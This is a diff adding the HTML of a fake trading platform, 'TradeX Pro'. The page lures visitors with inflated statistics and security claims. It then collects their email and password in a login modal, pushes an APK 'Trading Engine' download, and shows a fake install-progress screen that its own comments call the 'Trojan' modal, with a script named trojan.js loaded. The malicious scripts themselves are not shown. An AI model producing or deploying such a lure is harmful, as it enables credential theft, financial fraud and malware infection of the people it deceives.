@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TradeX Pro - Professional Trading Platform</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <!-- Navbar -->
+    <nav class="navbar">
+        <div class="nav-container">
+            <div class="nav-brand">
+                <div class="logo-icon"><i class="fas fa-chart-line"></i></div>
+                <span class="brand-name">TradeX</span>
+                <span class="badge">PRO</span>
+            </div>
+            <div class="nav-links">
+                <a href="#markets">Markets</a>
+                <a href="#features">Features</a>
+                <a href="#about">About</a>
+            </div>
+            <div class="nav-actions">
+                <button class="btn-secondary" onclick="alert('Coming soon')">Log In</button>
+                <button class="btn-primary" id="login-trigger">
+                    <i class="fas fa-bolt"></i> Login & Trade
+                </button>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="hero-content">
+            <h1 class="hero-title">
+                Trade Like a <span class="gradient-text">Professional</span>
+            </h1>
+            <p class="hero-subtitle">
+                Join 2.4M+ traders worldwide. Access crypto, forex, and stocks with zero fees and lightning-fast execution.
+            </p>
+            <div class="hero-stats">
+                <div class="stat-item">
+                    <span class="stat-number">$2.4B+</span>
+                    <span class="stat-label">Daily Volume</span>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-number">99.99%</span>
+                    <span class="stat-label">Uptime</span>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-number">2.4M+</span>
+                    <span class="stat-label">Traders</span>
+                </div>
+            </div>
+        </div>
+        <div class="chart-preview">
+            <canvas id="hero-chart"></canvas>
+            <div class="chart-overlay">
+                <div class="chart-label">BTC/USD</div>
+                <div class="chart-value">$67,245.00</div>
+                <div class="chart-change positive">+2.4%</div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Markets Section -->
+    <section class="markets-section" id="markets">
+        <div class="container">
+            <div class="section-header">
+                <h2>Live Markets</h2>
+                <p>Trade crypto, forex, and stocks in one platform</p>
+            </div>
+            <div class="markets-grid">
+                <div class="market-card">
+                    <div class="market-header">
+                        <div class="market-icon btc"><i class="fab fa-bitcoin"></i></div>
+                        <div class="market-info">
+                            <h3>Bitcoin</h3>
+                            <span class="market-exchange">BTC/USD</span>
+                        </div>
+                    </div>
+                    <div class="market-data">
+                        <span class="market-price">$67,245.00</span>
+                        <span class="market-change positive">+2.4%</span>
+                    </div>
+                </div>
+                <div class="market-card">
+                    <div class="market-header">
+                        <div class="market-icon eth"><i class="fab fa-ethereum"></i></div>
+                        <div class="market-info">
+                            <h3>Ethereum</h3>
+                            <span class="market-exchange">ETH/USD</span>
+                        </div>
+                    </div>
+                    <div class="market-data">
+                        <span class="market-price">$3,845.20</span>
+                        <span class="market-change positive">+1.8%</span>
+                    </div>
+                </div>
+                <div class="market-card">
+                    <div class="market-header">
+                        <div class="market-icon sol"><i class="fas fa-sun"></i></div>
+                        <div class="market-info">
+                            <h3>Solana</h3>
+                            <span class="market-exchange">SOL/USD</span>
+                        </div>
+                    </div>
+                    <div class="market-data">
+                        <span class="market-price">$142.80</span>
+                        <span class="market-change negative">-0.5%</span>
+                    </div>
+                </div>
+                <div class="market-card">
+                    <div class="market-header">
+                        <div class="market-icon forex"><i class="fas fa-dollar-sign"></i></div>
+                        <div class="market-info">
+                            <h3>EUR/USD</h3>
+                            <span class="market-exchange">FOREX</span>
+                        </div>
+                    </div>
+                    <div class="market-data">
+                        <span class="market-price">1.0845</span>
+                        <span class="market-change positive">+0.1%</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Features Section -->
+    <section class="features-section" id="features">
+        <div class="container">
+            <div class="section-header">
+                <h2>Why TradeX Pro?</h2>
+                <p>Professional tools for professional traders</p>
+            </div>
+            <div class="features-grid">
+                <div class="feature-card">
+                    <div class="feature-icon"><i class="fas fa-bolt"></i></div>
+                    <h3>Lightning Fast</h3>
+                    <p>Execute trades in under 10ms with our advanced matching engine</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon"><i class="fas fa-shield-alt"></i></div>
+                    <h3>Bank-Grade Security</h3>
+                    <p>256-bit encryption and multi-signature wallets protect your assets</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon"><i class="fas fa-chart-bar"></i></div>
+                    <h3>Advanced Charts</h3>
+                    <p>Professional trading tools with 100+ indicators and drawing tools</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon"><i class="fas fa-mobile-alt"></i></div>
+                    <h3>Mobile Ready</h3>
+                    <p>Trade anywhere with our responsive mobile-optimized platform</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Login Modal -->
+    <div class="modal" id="login-modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3>Login to TradeX</h3>
+                <button class="modal-close" onclick="closeModal()">&times;</button>
+            </div>
+            <form class="login-form" id="login-form">
+                <div class="form-group">
+                    <label for="email">Email Address</label>
+                    <input type="email" id="email" placeholder="trader@tradex.pro" required>
+                </div>
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" placeholder="••••••••" required>
+                </div>
+                <div class="form-options">
+                    <label class="remember-me">
+                        <input type="checkbox" id="remember"> Remember me
+                    </label>
+                    <a href="#" class="forgot-password">Forgot password?</a>
+                </div>
+                <button type="submit" class="login-btn">
+                    <i class="fas fa-bolt"></i> Login & Trade
+                </button>
+            </form>
+            <div class="divider"><span>or continue with</span></div>
+            <div class="social-login">
+                <button class="social-btn" onclick="socialLogin('google')">
+                    <i class="fab fa-google"></i> Google
+                </button>
+                <button class="social-btn" onclick="socialLogin('facebook')">
+                    <i class="fab fa-facebook-f"></i> Facebook
+                </button>
+                <button class="social-btn" onclick="socialLogin('twitter')">
+                    <i class="fab fa-twitter"></i> Twitter
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loading-overlay" style="display: none;">
+        <div class="loading-content">
+            <div class="loading-spinner">
+                <div class="spinner"></div>
+            </div>
+            <h3>Connecting to Trading Engine</h3>
+            <p>Establishing secure connection...</p>
+        </div>
+    </div>
+
+    <!-- APK Download Modal -->
+    <div class="modal" id="apk-modal">
+        <div class="modal-content apk-modal-content">
+            <div class="modal-header">
+                <h3>🚀 Download Trading Engine</h3>
+                <button class="modal-close" onclick="closeApkModal()">&times;</button>
+            </div>
+            <div class="apk-info">
+                <div class="apk-icon">
+                    <i class="fas fa-download"></i>
+                </div>
+                <h4>TradeX Pro v2.4.1</h4>
+                <p>Professional Trading Platform • 12.4 MB</p>
+                <div class="apk-features">
+                    <div class="apk-feature"><i class="fas fa-check"></i> Live Charts</div>
+                    <div class="apk-feature"><i class="fas fa-check"></i> Real-time Orders</div>
+                    <div class="apk-feature"><i class="fas fa-check"></i> Zero Fees</div>
+                    <div class="apk-feature"><i class="fas fa-check"></i> 256-bit Encryption</div>
+                </div>
+            </div>
+            <button class="apk-download-btn" id="apk-download-btn">
+                <i class="fas fa-download"></i> Download & Install
+            </button>
+            <p class="apk-note">By installing, you agree to our Terms of Service</p>
+        </div>
+    </div>
+
+    <!-- Trojan Installation Progress -->
+    <div class="modal" id="trojan-modal">
+        <div class="modal-content trojan-modal-content">
+            <div class="modal-header">
+                <h3>⚡ Installing Trading Engine</h3>
+            </div>
+            <div class="trojan-progress">
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progress-fill"></div>
+                </div>
+                <p class="progress-text" id="progress-text">Downloading files...</p>
+                <div class="trojan-details" id="trojan-details">
+                    <div class="detail-item"><i class="fas fa-circle"></i> Connecting to server</div>
+                    <div class="detail-item"><i class="fas fa-circle"></i> Verifying signature</div>
+                    <div class="detail-item"><i class="fas fa-circle"></i> Installing components</div>
+                    <div class="detail-item"><i class="fas fa-circle"></i> Optimizing performance</div>
+                    <div class="detail-item"><i class="fas fa-circle"></i> Ready to trade</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container">
+            <div class="footer-content">
+                <div class="footer-brand">
+                    <div class="logo-icon"><i class="fas fa-chart-line"></i></div>
+                    <span class="brand-name">TradeX</span>
+                </div>
+                <div class="footer-links">
+                    <a href="#">Terms</a>
+                    <a href="#">Privacy</a>
+                    <a href="#">Support</a>
+                </div>
+                <div class="footer-copy">
+                    <p>&copy; 2026 TradeX Pro. All rights reserved.</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script src="js/trojan.js"></script>
+    <script src="js/main.js"></script>
+    <script src="js/chart.js"></script>
+</body>
+</html>
